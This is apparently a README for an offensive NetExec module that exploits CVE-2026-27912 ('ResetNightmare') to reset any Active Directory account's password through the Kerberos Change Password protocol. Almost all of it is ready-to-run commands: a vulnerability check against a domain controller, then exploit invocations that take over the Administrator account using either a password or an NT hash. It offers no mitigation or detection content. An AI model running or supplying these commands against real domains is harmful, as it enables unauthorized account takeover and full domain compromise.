# ResetNightmare

`resetnightmare` module that exploits CVE-2026-27912 (ResetNightmare) to reset any user or computer account's password through the Kerberos Change Password protocol, based on the PoC by [Shai Laronne](https://github.com/Semperis-Community/ResetNightmare)


Check whether the DC is vulnerable:

```bash
nxc smb <dc_ip> -u user -p pass -M enum_cve -o CVE=CVE-2026-27912
```

Exploit:

```bash
nxc ldap <dc_ip> -u user -p pass -M resetnightmare -o TARGET=Administrator NEW_PASSWORD="NewPass!" UPN_USER=controlledPC$ UPN_PASSWORD="Passw0rd!"
nxc ldap <dc_ip> -u user -p pass -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_NTHASH='31d6cfe0d16ae931b73c59d7e0c089c0'
```
